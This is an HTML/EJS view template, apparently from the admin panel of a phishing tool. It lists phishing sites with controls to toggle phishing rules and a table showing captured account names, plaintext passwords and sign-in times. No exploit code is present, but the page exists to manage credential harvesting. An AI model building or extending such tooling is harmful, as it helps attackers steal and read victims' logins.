<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8">
		<title data-i18n="app.name"></title>
		<link rel="stylesheet" href="/css/normalize.css"/>
		<link rel="stylesheet" href="/css/main.css"/>
		<link rel="stylesheet" href="/css/redmond/jquery-ui-1.10.4.custom.min.css"/>
		<link rel="stylesheet" href="/css/fontello.css">
		<link rel="stylesheet" href="/css/animation.css">
		<!--[if IE 7]><link rel="stylesheet" href="/css/fontello-ie7.css"><![endif]-->
	</head>
	<body>
		<div class="wrapper">
			<%- include ../template/header %>
			<div class="fix-content">
				<div class="lb">
					<%- include ../template/function-tabs %>
				</div>
				<div class="rb">
					<div class="main-wrap">
						<div id="phishingSite" class="main">
							<div class="hd">
								<div class="hd-title">
									<h4 data-i18n="fn.phishing_web_site"></h4>
								</div>
							</div>
							<div class="bd">
								<div class="bd-l scrollable">
									<div class="card m-15">
										<div class="card-hd">
											<h4 data-i18n="phishing_web_site.website_card_titla"></h4>
											<!-- <div style="display: inline-block; margin-left: 10px;">
												<a href="javascript:;" class="btn">刷新</a>
											</div> -->
										</div>
										<div class="card-bd">
											<table id="phishing_site_list" style="min-width: 0;">
												<tbody>
												</tbody>
											</table>
										</div>
									</div>
								</div>
								<div class="bd-r scrollable">
									<div id="phishing_account_card" class="card m-15">
										<div class="card-hd">
											<h4 data-i18n="phishing_web_site.account_list_title"></h4>
											<!-- <div style="display: inline-block; margin-left: 10px;">
												<a href="javascript:;" class="btn">刷新</a>
											</div> -->
										</div>
										<div class="card-bd">
											<table id="phishing_account_list" style="min-width: 0;">
												<thead>
													<tr>
														<th class="col-1-3" data-i18n="phishing_web_site.account_list_th_account"></th>
														<th class="col-1-3" data-i18n="phishing_web_site.account_list_th_password"></th>
														<th class="col-1-3" data-i18n="phishing_web_site.account_list_th_signin_time"></th>
													</tr>
												</thead>
												<tbody></tbody>
											</table>
										</div>
									</div>
								</div>
							</div>
						</div>
					</div>
				</div>
			</div>
			<%- include ../template/footer %>
		</div>
		<script type="text/template" id="tpl_phishing_site_row">
			<tr>
				<td class="col-1-3">{%= name %}</td>
				<td class="col-2-3">
					<input type="hidden" id="key" value="{%= site_key %}" />
					<input type="hidden" id="name" value="{%= name %}" />
					{% if(status == 0) { %}
					<a class="btn btn-startup" href="javascript:;" data-i18n="btn.enable_phishing_rule"></a>
					{% } else if(status == 1) { %}
					<a class="btn btn-shutdown" href="javascript:;" data-i18n="btn.disable_phishing_rule"></a>
					{% } %}
					<a class="btn btn-searchAccount" href="javascript:;" data-i18n="btn.look_for_phishing_act"></a>
				</td>
			</tr>
		</script>
		<script type="text/template" id="tpl_phishing_account_row">
			<tr>
				<td>{%= account %}</td>
				<td>{%= password %}</td>
				<td>{%= $.formatDateTime(new Date(parseInt(signin_time, 10)), 'yyyy-MM-dd HH:mm:ss') %}</td>
			</tr>
		</script>
		<%- include ../template/script %>
	</body>
</html>